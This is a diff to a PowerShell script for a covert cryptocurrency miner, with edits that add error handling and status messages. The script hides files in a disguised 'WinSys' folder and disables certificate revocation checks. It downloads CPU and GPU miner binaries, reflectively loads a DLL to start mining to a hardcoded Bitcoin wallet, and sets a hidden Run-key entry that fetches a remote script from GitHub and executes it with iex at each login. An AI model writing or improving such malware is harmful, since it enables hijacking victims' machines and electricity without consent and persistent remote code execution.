@@ -7,7 +7,7 @@ $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 
 $StealthDir = "$env:LOCALAPPDATA\WinSys"
 
-Write-Host "Connecting to network..."
+Write-Host "Connecting to network..." -ForegroundColor Cyan
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::CheckCertificateRevocationList = $false
 
@@ -26,11 +26,14 @@ function Get-StealthFile($Url, $Path) {
     return $false
 }
 
-if (-not (Test-Path $StealthDir)) {
-    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
-} else {
-    Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
-}
+# Cleanup and Prep
+try {
+    if (-not (Test-Path $StealthDir)) {
+        New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
+    } else {
+        Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+    }
+} catch { }
 
 $CpuZip = Join-Path $StealthDir "upd_c.zip"
 $GpuZip = Join-Path $StealthDir "upd_g.zip"
@@ -39,6 +42,7 @@ $GpuExe = Join-Path $StealthDir "WinSystem_g.exe"
 
 # Deploy CPU
 if (-not (Test-Path $CpuExe)) {
+    Write-Host "Installing CPU Engine..." -ForegroundColor Gray
     if (Get-StealthFile $MinerUrl $CpuZip) {
         Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
         Remove-Item $CpuZip -Force
@@ -57,6 +61,7 @@ try {
 } catch { }
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
+    Write-Host "Installing GPU Engine..." -ForegroundColor Gray
     if (Get-StealthFile $GpuMinerUrl $GpuZip) {
         Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
         Remove-Item $GpuZip -Force
@@ -65,11 +70,18 @@ if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     }
 }
 
-# Deploy DLL & Startup
+# Finalize
+Write-Host "Syncing Manager..." -ForegroundColor Gray
 $DllPath = Join-Path $StealthDir "Bridge.dll"
 if (Get-StealthFile $DllUrl $DllPath) {
-    if ((Get-Item $DllPath).Length -gt 1000) {
+    try {
         $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
+        
+        # Verify it's actually a DLL and not a 404 page
+        if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
+            throw "Downloaded file is not a valid DLL (Check your GitHub link!)"
+        }
+
         $assembly = [System.Reflection.Assembly]::Load($dllBytes)
         $loader = $assembly.GetType("DateFundLoader")
         $startMethod = $loader.GetMethod("StartMiner")
@@ -79,9 +91,13 @@ if (Get-StealthFile $DllUrl $DllPath) {
         $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $Name = "WinSys"
         $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[Net.ServicePointManager]::CheckCertificateRevocationList = `$false; iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
-        Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
+        Set-ItemProperty -Path $RegPath -Name $Name -Value $Value | Out-Null
         
-        Write-Host "Worker ON" -ForegroundColor Green
+        Write-Host "`nWorker ON" -ForegroundColor Green
         $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
+    } catch {
+        Write-Host "`nCRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
     }
+} else {
+    Write-Host "`nFAILED to download Bridge.dll" -ForegroundColor Red
 }
